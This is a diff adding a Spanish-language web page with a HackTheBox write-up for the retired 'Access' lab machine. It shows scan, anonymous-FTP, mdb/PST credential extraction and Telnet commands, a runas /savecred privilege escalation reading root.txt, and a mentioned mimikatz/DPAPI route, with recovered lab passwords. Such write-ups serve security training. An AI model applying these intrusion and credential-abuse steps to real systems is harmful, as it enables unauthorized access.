@@ -1,0 +1,343 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <meta http-equiv="Content-Security-Policy" content="default-src 'self'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src https://fonts.gstatic.com; script-src 'self' 'unsafe-inline'; img-src 'self' data:; connect-src 'self'; base-uri 'self'; form-action 'none'; object-src 'none'">
+  <meta name="referrer" content="strict-origin-when-cross-origin">
+  <title>Access — HackTheBox Writeup | Brandeiks</title>
+  <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%2064%2064'%3E%3Crect%20width='64'%20height='64'%20rx='13'%20fill='%2300ff88'/%3E%3Ctext%20x='32'%20y='34'%20text-anchor='middle'%20dominant-baseline='central'%20font-family='Arial%20Black,%20Arial,%20Helvetica,%20sans-serif'%20font-size='46'%20font-weight='900'%20fill='%23050a0e'%3EB%3C/text%3E%3C/svg%3E">
+  <link rel="apple-touch-icon" href="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%2064%2064'%3E%3Crect%20width='64'%20height='64'%20rx='13'%20fill='%2300ff88'/%3E%3Ctext%20x='32'%20y='34'%20text-anchor='middle'%20dominant-baseline='central'%20font-family='Arial%20Black,%20Arial,%20Helvetica,%20sans-serif'%20font-size='46'%20font-weight='900'%20fill='%23050a0e'%3EB%3C/text%3E%3C/svg%3E">
+  <meta name="description" content="Writeup de la máquina Access de HackTheBox (Windows, Fácil): el FTP anónimo entrega una base de Access y un ZIP con un PST; dentro hay la contraseña de la cuenta security para Telnet, y las credenciales cacheadas del Administrador permiten runas /savecred para leer la root flag.">
+  <meta name="author" content="Brandon Zevallos Pastrana">
+  <link rel="canonical" href="https://brandeiks.github.io/writeups/hackthebox/facil/access.html">
+  <meta property="og:type" content="article">
+  <meta property="og:site_name" content="Brandeiks">
+  <meta property="og:title" content="Access — HackTheBox Writeup | Brandeiks">
+  <meta property="og:description" content="Writeup de la máquina Access de HackTheBox (Windows, Fácil): el FTP anónimo entrega una base de Access y un ZIP con un PST; dentro hay la contraseña de la cuenta security para Telnet, y las credenciales cacheadas del Administrador permiten runas /savecred para leer la root flag.">
+  <meta property="og:url" content="https://brandeiks.github.io/writeups/hackthebox/facil/access.html">
+  <meta property="og:image" content="https://brandeiks.github.io/assets/og/access.png">
+  <meta property="og:image:width" content="1200">
+  <meta property="og:image:height" content="630">
+  <meta property="og:locale" content="es_ES">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="Access — HackTheBox Writeup | Brandeiks">
+  <meta name="twitter:description" content="Writeup de la máquina Access de HackTheBox (Windows, Fácil): el FTP anónimo entrega una base de Access y un ZIP con un PST; dentro hay la contraseña de la cuenta security para Telnet, y las credenciales cacheadas del Administrador permiten runas /savecred para leer la root flag.">
+  <meta name="twitter:image" content="https://brandeiks.github.io/assets/og/access.png">
+  <script type="application/ld+json">{"@context": "https://schema.org", "@type": "TechArticle", "headline": "Access — HackTheBox Writeup | Brandeiks", "description": "Writeup de la máquina Access de HackTheBox (Windows, Fácil): el FTP anónimo entrega una base de Access y un ZIP con un PST; dentro hay la contraseña de la cuenta security para Telnet, y las credenciales cacheadas del Administrador permiten runas /savecred para leer la root flag.", "inLanguage": "es", "url": "https://brandeiks.github.io/writeups/hackthebox/facil/access.html", "image": "https://brandeiks.github.io/assets/og/access.png", "author": {"@type": "Person", "name": "Brandon Zevallos Pastrana", "url": "https://brandeiks.github.io/"}, "publisher": {"@type": "Organization", "name": "Brandeiks", "url": "https://brandeiks.github.io/"}, "mainEntityOfPage": {"@type": "WebPage", "@id": "https://brandeiks.github.io/writeups/hackthebox/facil/access.html"}}</script>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link rel="stylesheet" href="../../../assets/writeups.css">
+  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@300;400;600;700&family=Orbitron:wght@400;900&display=swap" rel="stylesheet"/>
+  <style>
+    /* FOOTER */
+
+    @media (max-width: 1024px) {
+      .writeup-layout { grid-template-columns: 1fr; }
+      .sidebar { position: static; order: -1; display: flex; gap: 1rem; flex-wrap: wrap; }
+      .sidebar-box { flex: 1; min-width: 200px; margin-bottom: 0; }
+    }
+    @media (max-width: 768px) {
+      nav { padding: 1rem 1.5rem; }
+      .writeup-hero { padding: 6rem 1.5rem 2.5rem; }
+      .writeup-layout { padding: 2rem 1.5rem; }
+      .cmd-ref-grid { grid-template-columns: 1fr; }
+      body, a, button { cursor: auto; }
+      .cursor, .cursor-ring { display: none; }
+    }
+
+        /* NAV RESPONSIVE */
+    @media (max-width: 900px) {
+      nav { padding: 0.7rem 1rem; }
+      .nav-logo { font-size: 0.85rem; letter-spacing: 2px; }
+      .nav-back { font-size: 0.68rem; margin-left: 0.8rem; }
+    }
+    @media (max-width: 700px) {
+      nav { flex-wrap: wrap; justify-content: space-between; row-gap: 0; padding: 0.6rem 1rem; }
+      .nav-logo { font-size: 0.82rem; letter-spacing: 1px; }
+      .menu-btn {
+        display: flex; align-items: center; justify-content: center;
+        width: 40px; height: 34px; cursor: pointer;
+        border: 1px solid var(--dim); border-radius: 3px;
+      }
+      .menu-btn span, .menu-btn span::before, .menu-btn span::after {
+        display: block; width: 18px; height: 2px; background: var(--green);
+        transition: transform 0.25s, opacity 0.25s;
+      }
+      .menu-btn span { position: relative; }
+      .menu-btn span::before, .menu-btn span::after { content: ''; position: absolute; left: 0; }
+      .menu-btn span::before { top: -6px; }
+      .menu-btn span::after { top: 6px; }
+      .menu-check:checked ~ nav .menu-btn span { background: transparent; }
+      .menu-check:checked ~ nav .menu-btn span::before { transform: translateY(6px) rotate(45deg); }
+      .menu-check:checked ~ nav .menu-btn span::after { transform: translateY(-6px) rotate(-45deg); }
+      .nav-back { display: none; }
+      .menu-check:checked ~ nav .nav-back {
+        display: block; width: 100%; text-align: center;
+        margin: 0; padding: 0.7rem 0; font-size: 0.78rem;
+        border-top: 1px solid var(--dim);
+      }
+    }
+    @media (max-width: 480px) {
+      nav { padding: 0.55rem 0.8rem; }
+      .nav-logo { font-size: 0.76rem; }
+      .menu-check:checked ~ nav .nav-back { font-size: 0.72rem; padding: 0.6rem 0; }
+          footer { flex-direction: column; gap: 0.8rem; text-align: center; padding: 1.5rem; }
+}
+  </style>
+</head>
+<body>
+
+<a href="#main" class="skip-link">Saltar al contenido</a>
+<noscript><div class="aviso-noscript"><strong>JavaScript desactivado:</strong> la navegación entre writeups, el modo guion, el zoom de capturas y el progreso de lectura necesitan JavaScript. El contenido del writeup, los comandos y los enlaces del índice funcionan igualmente.</div></noscript>
+<div class="progress-container"><div class="progress-bar" id="readingProgress"></div></div>
+
+<!-- NAV -->
+<input type="checkbox" id="menuAbierto" class="menu-check" aria-hidden="true">
+<nav>
+    <a href="../../../index.html" class="nav-logo">BRANDEIKS_SEC</a>
+    <label for="menuAbierto" class="menu-btn" aria-label="Abrir menú"><span></span></label>
+    <a href="../../../index.html" class="nav-back">INICIO</a>
+    <a href="../../../videos/index.html" class="nav-back">VÍDEOS</a>
+    <a href="../../../writeups/index.html" class="nav-back">WRITEUPS</a>
+    <a href="../../../herramientas/index.html" class="nav-back">HERRAMIENTAS</a>
+    <a href="../../../certificaciones.html" class="nav-back">CERTIFICACIONES</a>
+  </nav>
+
+<!-- HERO -->
+<div class="writeup-hero">
+  <div class="hero-grid"></div>
+  <div class="hero-glow"></div>
+  <div class="writeup-hero-content">
+    <div class="breadcrumb">
+      <a href="../../../index.html">brandeiks</a> /
+      <a href="../../../writeups/index.html">writeups</a> /
+      <a href="../../../writeups/index.html">hackthebox</a> /
+      <span>access</span>
+    </div>
+    <h1 class="writeup-title">AC<span>CESS</span></h1>
+    <p class="writeup-subtitle">// FTP anónimo → backup.mdb + ZIP → PST → Telnet → runas /savecred → Administrator</p>
+    <div class="writeup-meta">
+      <span class="meta-badge badge-facil">● FÁCIL</span>
+      <span class="meta-badge badge-htb">HACKTHEBOX</span>
+      <span class="meta-badge badge-windows">WINDOWS</span>
+      <span class="meta-badge badge-ftp">FTP ANÓNIMO</span>
+      <span class="meta-badge badge-creds">MDB + PST</span>
+      <span class="meta-badge badge-shell">TELNET</span>
+      <span class="meta-badge badge-sudo">RUNAS /SAVECRED</span>
+      <span class="meta-date">📅 Octubre 2026 · Por Brandeiks</span>
+    </div>
+  </div>
+</div>
+
+<!-- LAYOUT -->
+<div class="writeup-layout">
+  <aside class="sidebar">
+    <div class="sidebar-box">
+      <p class="sidebar-title">// ÍNDICE</p>
+      <ul class="toc-list">
+        <li><a href="#resumen">01 · Resumen</a></li><li><a href="#puertos">02 · Puertos</a></li><li><a href="#paso1">03 · Reconocimiento</a></li><li><a href="#paso2">04 · FTP anónimo</a></li><li><a href="#paso3">05 · La base de datos</a></li><li><a href="#paso4">06 · El ZIP y el correo</a></li><li><a href="#paso5">07 · Telnet como security</a></li><li><a href="#paso6">08 · Root con las credenciales cacheadas</a></li><li><a href="#paso7">09 · Limpieza</a></li><li><a href="#datos">10 · Flags y credenciales</a></li><li><a href="#referencias">11 · Referencias</a></li>
+      </ul>
+    </div>
+    <div class="sidebar-box">
+      <p class="sidebar-title">// INFO MÁQUINA</p>
+      <div class="info-row"><span class="info-label">NOMBRE</span><span class="info-val val-cyan">Access</span></div>
+      <div class="info-row"><span class="info-label">SISTEMA</span><span class="info-val val-cyan">Windows 7 / 2008 R2</span></div>
+      <div class="info-row"><span class="info-label">ENTRADA</span><span class="info-val val-yellow">FTP anónimo</span></div>
+      <div class="info-row"><span class="info-label">TÉCNICA</span><span class="info-val val-red">Credenciales cacheadas</span></div>
+      <div class="info-row"><span class="info-label">PLATAFORMA</span><span class="info-val val-yellow">HackTheBox</span></div>
+      <div class="info-row"><span class="info-label">ESTADO</span><span class="info-val val-green">● Retirada</span></div>
+    </div>
+    <div class="sidebar-box">
+      <p class="sidebar-title">// RUTA DE ATAQUE</p>
+      <div class="attack-path">
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text">FTP anónimo → <span>backup.mdb</span></div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text">ZIP + PST → <span>security</span></div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text">Telnet → <span>user flag</span></div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text">cmdkey → <span>runas /savecred</span></div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>administrator</span></div></div>
+      </div>
+    </div>
+  </aside>
+
+  <main id="main" class="writeup-content">
+    <div class="section" id="resumen">
+      <p class="section-label">// 01</p>
+      <h2 class="section-title">Resumen</h2>
+      <div class="section-line"></div>
+      <div class="prose"><p><strong>Resumen.</strong> No hay SMB: la entrada es el FTP anónimo. De ahí salen una base de datos de Access (<code style="color:var(--yellow)">backup.mdb</code>) con los usuarios de la aplicación y un ZIP cifrado (AES-256) con un PST de Outlook. La tabla <code style="color:var(--yellow)">auth_user</code> da <code style="color:var(--yellow)">engineer:access4u@security</code>, que abre el ZIP; dentro hay un correo que dice la nueva contraseña de la cuenta <code style="color:var(--yellow)">security</code> (<code style="color:var(--yellow)">4Cc3ssC0ntr0ller</code>). Con ella se entra por <strong>Telnet</strong> y se lee la user flag. En el escritorio público hay un acceso directo que usa <code style="color:var(--yellow)">runas /savecred</code> para el Administrador: las credenciales están <strong>cacheadas</strong> (<code style="color:var(--yellow)">cmdkey /list</code>), así que <code style="color:var(--yellow)">runas /savecred</code> ejecuta comandos como Administrador y se lee la root flag.</p></div>
+      <div class="info-box"><p class="info-box-title">// NOTA</p><p><strong>Versión simplificada (la usada):</strong> dos detalles técnicos y el resto es leer ficheros. (1) El FTP responde al <code style="color:var(--yellow)">PASV</code> con <code style="color:var(--yellow)">0.0.0.0</code>, así que hay que descargar en <strong>modo activo</strong>. (2) El Telnet de Windows exige responder a la negociación IAC (WILL/DO → DONT/WONT) antes de mostrar el <code style="color:var(--yellow)">login:</code>.</p></div>
+    </div>
+    <hr class="divider">
+    <div class="section" id="puertos">
+      <p class="section-label">// 02</p>
+      <h2 class="section-title">Puertos</h2>
+      <div class="section-line"></div>
+      <table class="vuln-table"><thead><tr><th>Puerto</th><th>Servicio</th></tr></thead><tbody>
+      <tr><td>21/tcp</td><td>FTP (Microsoft ftpd, anónimo)</td></tr>
+      <tr><td>23/tcp</td><td>Telnet (Microsoft Telnet Server)</td></tr>
+      <tr><td>80/tcp</td><td>HTTP (IIS 7.5) — sólo una imagen</td></tr>
+      </tbody></table>
+    </div>
+    <hr class="divider">
+    <div class="section" id="paso1">
+      <p class="section-label">// 03</p>
+      <h2 class="section-title">Reconocimiento</h2>
+      <div class="section-line"></div>
+      <div class="cmd-block" data-cmd="sudo nmap -sS -p- -n -Pn --min-rate 2500 --max-retries 1 --open 10.129.6.221
+sudo nmap -Pn -sV -p21,23,80 10.129.6.221"><button class="copy-btn" onclick="copyCmd(this)">COPIAR</button><span class="cmd-label">SHELL</span><div><span class="prompt">$ </span><span class="cmd">sudo nmap -sS -p- -n -Pn --min-rate 2500 --max-retries 1 --open 10.129.6.221</span></div><div><span class="prompt">$ </span><span class="cmd">sudo nmap -Pn -sV -p21,23,80 10.129.6.221</span></div></div>
+      <div class="prose"><p><strong>Lo que se encontró:</strong> <code style="color:var(--yellow)">21 ftp</code>, <code style="color:var(--yellow)">23 telnet</code>, <code style="color:var(--yellow)">80 http (Microsoft IIS 7.5)</code>. La web sólo sirve una imagen y no tiene rutas útiles.</p></div>
+    </div>
+    <hr class="divider">
+    <div class="section" id="paso2">
+      <p class="section-label">// 04</p>
+      <h2 class="section-title">FTP anónimo</h2>
+      <div class="section-line"></div>
+      <div class="cmd-block" data-cmd="# ojo: el PASV anuncia 0.0.0.0 -&gt; usar modo ACTIVO
+python3 ftp_get.py          # ftplib con set_pasv(False)"><button class="copy-btn" onclick="copyCmd(this)">COPIAR</button><span class="cmd-label">SHELL</span><div><span class="comment"># ojo: el PASV anuncia 0.0.0.0 -&gt; usar modo ACTIVO</span></div><div><span class="prompt">$ </span><span class="cmd">python3 ftp_get.py          # ftplib con set_pasv(False)</span></div></div>
+      <div class="prose"><p><strong>Lo que se encontró:</strong></p></div>
+      <table class="vuln-table"><thead><tr><th>Ruta</th><th>Tamaño</th></tr></thead><tbody>
+      <tr><td><code style="color:var(--yellow)">/Backups/backup.mdb</code></td><td>5 652 480 B (base de datos Access)</td></tr>
+      <tr><td><code style="color:var(--yellow)">/Engineer/Access Control.zip</code></td><td>10 870 B (AES-256)</td></tr>
+      </tbody></table>
+      <div class="prose"><p><strong>Trampa:</strong> con <code style="color:var(--yellow)">lftp</code>/<code style="color:var(--yellow)">wget</code> se queda colgado porque el servidor responde <code style="color:var(--yellow)">227 Entering Passive Mode (0,0,0,0,192,7)</code>. <code style="color:var(--yellow)">ftplib</code> en <strong>modo activo</strong> (<code style="color:var(--yellow)">set_pasv(False)</code>) funciona a la primera.</p></div>
+    </div>
+    <hr class="divider">
+    <div class="section" id="paso3">
+      <p class="section-label">// 05</p>
+      <h2 class="section-title">La base de datos</h2>
+      <div class="section-line"></div>
+      <div class="cmd-block" data-cmd="sudo apt install -y mdbtools
+mdb-tables backup.mdb | tr &#x27; &#x27; &#x27;\n&#x27; | head
+mdb-export backup.mdb auth_user"><button class="copy-btn" onclick="copyCmd(this)">COPIAR</button><span class="cmd-label">SHELL</span><div><span class="prompt">$ </span><span class="cmd">sudo apt install -y mdbtools</span></div><div><span class="prompt">$ </span><span class="cmd">mdb-tables backup.mdb | tr &#x27; &#x27; &#x27;\n&#x27; | head</span></div><div><span class="prompt">$ </span><span class="cmd">mdb-export backup.mdb auth_user</span></div></div>
+      <div class="prose"><p><strong>Lo que se encontró:</strong></p></div>
+      <div class="output-block"><div>id,username,password,Status,last_login,RoleID,Remark</div><div>25,&quot;admin&quot;,&quot;admin&quot;,1,...</div><div>27,&quot;engineer&quot;,&quot;access4u@security&quot;,1,...</div><div>28,&quot;backup_admin&quot;,&quot;admin&quot;,1,...</div></div>
+    </div>
+    <hr class="divider">
+    <div class="section" id="paso4">
+      <p class="section-label">// 06</p>
+      <h2 class="section-title">El ZIP y el correo</h2>
+      <div class="section-line"></div>
+      <div class="cmd-block" data-cmd="7z x -p&#x27;access4u@security&#x27; &quot;Access Control.zip&quot;       # -&gt; Access Control.pst
+readpst &quot;Access Control.pst&quot;                          # -&gt; Access Control.mbox
+grep -aiE &#x27;password&#x27; &quot;Access Control.mbox&quot;"><button class="copy-btn" onclick="copyCmd(this)">COPIAR</button><span class="cmd-label">SHELL</span><div><span class="prompt">$ </span><span class="cmd">7z x -p&#x27;access4u@security&#x27; &quot;Access Control.zip&quot;       # -&gt; Access Control.pst</span></div><div><span class="prompt">$ </span><span class="cmd">readpst &quot;Access Control.pst&quot;                          # -&gt; Access Control.mbox</span></div><div><span class="prompt">$ </span><span class="cmd">grep -aiE &#x27;password&#x27; &quot;Access Control.mbox&quot;</span></div></div>
+      <div class="prose"><p><strong>Lo que se encontró:</strong> el correo *&quot;MegaCorp Access Control System &#x27;security&#x27; account&quot;*:</p></div>
+      <div class="info-box"><p class="info-box-title">// NOTA</p><p>The password for the &quot;security&quot; account has been changed to <strong>4Cc3ssC0ntr0ller</strong>.</p></div>
+    </div>
+    <hr class="divider">
+    <div class="section" id="paso5">
+      <p class="section-label">// 07</p>
+      <h2 class="section-title">Telnet como security</h2>
+      <div class="section-line"></div>
+      <div class="cmd-block" data-cmd="python3 telnet2.py &#x27;whoami&#x27; &#x27;cd C:\Users\security\Desktop&#x27; &#x27;type user.txt&#x27; &#x27;cmdkey /list&#x27;"><button class="copy-btn" onclick="copyCmd(this)">COPIAR</button><span class="cmd-label">SHELL</span><div><span class="prompt">$ </span><span class="cmd">python3 telnet2.py &#x27;whoami&#x27; &#x27;cd C:\Users\security\Desktop&#x27; &#x27;type user.txt&#x27; &#x27;cmdkey /list&#x27;</span></div></div>
+      <div class="prose"><p><strong>Lo que se encontró:</strong> <code style="color:var(--yellow)">access\security</code>, la user flag <strong><code style="color:var(--yellow)">[flag oculta]</code></strong> y, en <code style="color:var(--yellow)">cmdkey /list</code>:</p></div>
+      <div class="output-block"><div>    Target: Domain:interactive=ACCESS\Administrator</div><div>    Type: Domain Password</div><div>    User: ACCESS\Administrator</div></div>
+      <div class="prose"><p>*(El cliente tiene que responder al IAC; si no, el servidor no llega a mostrar <code style="color:var(--yellow)">login:</code>.)*</p></div>
+    </div>
+    <hr class="divider">
+    <div class="section" id="paso6">
+      <p class="section-label">// 08</p>
+      <h2 class="section-title">Root con las credenciales cacheadas</h2>
+      <div class="section-line"></div>
+      <div class="cmd-block" data-cmd="python3 telnet2.py &#x27;runas /user:ACCESS\Administrator /savecred &quot;cmd /c type C:\Users\Administrator\Desktop\root.txt &gt; C:\Users\security\Desktop\r.txt&quot;&#x27; &#x27;type C:\Users\security\Desktop\r.txt&#x27;"><button class="copy-btn" onclick="copyCmd(this)">COPIAR</button><span class="cmd-label">SHELL</span><div><span class="prompt">$ </span><span class="cmd">python3 telnet2.py &#x27;runas /user:ACCESS\Administrator /savecred &quot;cmd /c type C:\Users\Administrator\Desktop\root.txt &gt; C:\Users\security\Desktop\r.txt&quot;&#x27; &#x27;type C:\Users\security\Desktop\r.txt&#x27;</span></div></div>
+      <div class="prose"><p><strong>Lo que se encontró:</strong> <code style="color:var(--yellow)">r.txt</code> con la root flag <strong><code style="color:var(--yellow)">[flag oculta]</code></strong>.</p></div>
+      <div class="prose"><p><strong>Por qué funciona:</strong> <code style="color:var(--yellow)">runas /savecred</code> usa la credencial guardada del Administrador (la misma que aparece en <code style="color:var(--yellow)">cmdkey /list</code> y en el <code style="color:var(--yellow)">.lnk</code> del escritorio público: <code style="color:var(--yellow)">runas.exe /user:ACCESS\Administrator /savecred</code>). No hace falta conocer la contraseña.</p></div>
+      <div class="prose"><p><strong>Alternativa (DPAPI, también comprobada):</strong> volcar la masterkey y el blob de credenciales + <code style="color:var(--yellow)">mimikatz</code>/<code style="color:var(--yellow)">pypykatz</code> → contraseña <code style="color:var(--yellow)">55Acc3ssS3cur1ty@megacorp</code> → <code style="color:var(--yellow)">telnet</code> como <code style="color:var(--yellow)">administrator</code> y <code style="color:var(--yellow)">type root.txt</code>.</p></div>
+    </div>
+    <hr class="divider">
+    <div class="section" id="paso7">
+      <p class="section-label">// 09</p>
+      <h2 class="section-title">Limpieza</h2>
+      <div class="section-line"></div>
+      <div class="cmd-block" data-cmd="python3 telnet2.py &#x27;del C:\Users\security\Desktop\r.txt&#x27;"><button class="copy-btn" onclick="copyCmd(this)">COPIAR</button><span class="cmd-label">SHELL</span><div><span class="prompt">$ </span><span class="cmd">python3 telnet2.py &#x27;del C:\Users\security\Desktop\r.txt&#x27;</span></div></div>
+      <div class="prose"><p>No se modificó nada más en la máquina.</p></div>
+    </div>
+    <hr class="divider">
+    <div class="section" id="datos">
+      <p class="section-label">// 10</p>
+      <h2 class="section-title">Flags y credenciales</h2>
+      <div class="section-line"></div>
+      <table class="vuln-table"><thead><tr><th>Flag</th><th>Valor</th><th>Dónde</th></tr></thead><tbody>
+      <tr><td>user.txt</td><td><code style="color:var(--yellow)">[flag oculta]</code></td><td><code style="color:var(--yellow)">C:\Users\security\Desktop\user.txt</code></td></tr>
+      <tr><td>root.txt</td><td><code style="color:var(--yellow)">[flag oculta]</code></td><td><code style="color:var(--yellow)">C:\Users\Administrator\Desktop\root.txt</code></td></tr>
+      </tbody></table>
+      <div class="prose"><p><strong>Credenciales encontradas</strong></p></div>
+      <table class="vuln-table"><thead><tr><th>Cuenta</th><th>Credencial</th><th>Cómo</th></tr></thead><tbody>
+      <tr><td>FTP</td><td>anónimo</td><td>acceso por defecto</td></tr>
+      <tr><td>App (<code style="color:var(--yellow)">engineer</code>)</td><td><code style="color:var(--yellow)">access4u@security</code></td><td>tabla <code style="color:var(--yellow)">auth_user</code> de <code style="color:var(--yellow)">backup.mdb</code></td></tr>
+      <tr><td>ZIP</td><td><code style="color:var(--yellow)">access4u@security</code></td><td>misma contraseña reutilizada</td></tr>
+      <tr><td><code style="color:var(--yellow)">security</code> (Windows)</td><td><code style="color:var(--yellow)">4Cc3ssC0ntr0ller</code></td><td>correo dentro del PST</td></tr>
+      <tr><td><code style="color:var(--yellow)">Administrator</code></td><td><code style="color:var(--yellow)">55Acc3ssS3cur1ty@megacorp</code></td><td>DPAPI (alternativa); también con <code style="color:var(--yellow)">runas /savecred</code> sin saberla</td></tr>
+      </tbody></table>
+      <div class="info-box"><p class="info-box-title">// RUTA DE ATAQUE</p><p>FTP anónimo → <code style="color:var(--yellow)">backup.mdb</code> → <code style="color:var(--yellow)">engineer:access4u@security</code> → ZIP → PST → correo → <code style="color:var(--yellow)">security:4Cc3ssC0ntr0ller</code> → Telnet → user flag → credenciales cacheadas → <code style="color:var(--yellow)">runas /savecred</code> → root flag.</p></div>
+    </div>
+    <hr class="divider">
+    <div class="section" id="referencias">
+      <p class="section-label">// 11</p>
+      <h2 class="section-title">Referencias</h2>
+      <div class="section-line"></div>
+      <div class="prose"><p>- [0xdf — Access](https://0xdf.gitlab.io/2019/03/02/htb-access.html) · [pointedsec](https://pointedsec.github.io/writeups/access---hackthebox/) · [Arabot](https://github.com/Caan31/-HackTheBox-Writeups-by-Arabot/blob/master/facil/ACCESS/Access_Writeup.md)</p></div>
+    </div>
+  <div class="writeup-nav" aria-label="Navegación entre writeups"><a class="anterior" href="arctic.html"><span class="dir">← ANTERIOR</span><span class="nombre">Arctic</span></a><a class="siguiente" href="buff.html"><span class="dir">SIGUIENTE →</span><span class="nombre">Buff</span></a></div>
+  </main>
+</div>
+
+<!-- FOOTER -->
+<footer>
+    <p>© 2026 <span>Brandon Zevallos Pastrana</span> — Writeup de Access · HackTheBox</p>
+    <p>Hecho con <span>kali linux</span> &amp; <span>❤</span></p>
+  </footer>
+
+<script>
+  const sections = document.querySelectorAll('.section[id]');
+  const tocLinks = document.querySelectorAll('.toc-list a');
+  const tocObserver = new IntersectionObserver(entries => {
+    entries.forEach(e => {
+      if (e.isIntersecting) {
+        tocLinks.forEach(a => a.classList.remove('active'));
+        const active = document.querySelector(`.toc-list a[href="#${e.target.id}"]`);
+        if (active) active.classList.add('active');
+      }
+    });
+  }, { rootMargin: '-30% 0px -60% 0px' });
+  sections.forEach(s => tocObserver.observe(s));
+
+  const obs = new IntersectionObserver(entries => {
+    entries.forEach(e => { if (e.isIntersecting) e.target.classList.add('visible'); });
+  }, { threshold: 0.06 });
+  document.querySelectorAll('.section').forEach(s => obs.observe(s));
+
+  window.addEventListener('scroll', () => {
+    const winScroll = document.documentElement.scrollTop;
+    const height = document.documentElement.scrollHeight - window.innerHeight;
+    const scrolled = height > 0 ? (winScroll / height) * 100 : 0;
+    const bar = document.getElementById('readingProgress');
+    if (bar) bar.style.width = scrolled + '%';
+  });
+
+  function showToast(msg) {
+    let toast = document.querySelector('.toast');
+    if (!toast) { toast = document.createElement('div'); toast.className = 'toast'; document.body.appendChild(toast); }
+    toast.textContent = '📋 ' + msg;
+    toast.classList.add('show');
+    setTimeout(() => toast.classList.remove('show'), 2000);
+  }
+  function copyCmd(btn) {
+    const block = btn.closest('.cmd-block');
+    const cmd = block.dataset.cmd || '';
+    navigator.clipboard.writeText(cmd).then(() => {
+      btn.textContent = '✓ OK'; btn.classList.add('copied');
+      showToast('Comando copiado ✓');
+      setTimeout(() => { btn.textContent = 'COPIAR'; btn.classList.remove('copied'); }, 1800);
+    }).catch(() => { showToast('Error al copiar'); });
+  }
+</script>
+<script id="datos-writeup" type="application/json">{"nombre": "ACCESS", "plataforma": "hackthebox", "dificultad": "facil", "url": "https://brandeiks.github.io/writeups/hackthebox/facil/access.html"}</script>
+<script src="../../../assets/cursor.js" defer></script>
+<script src="../../../assets/writeup.js" defer></script>
+</body>
+</html>
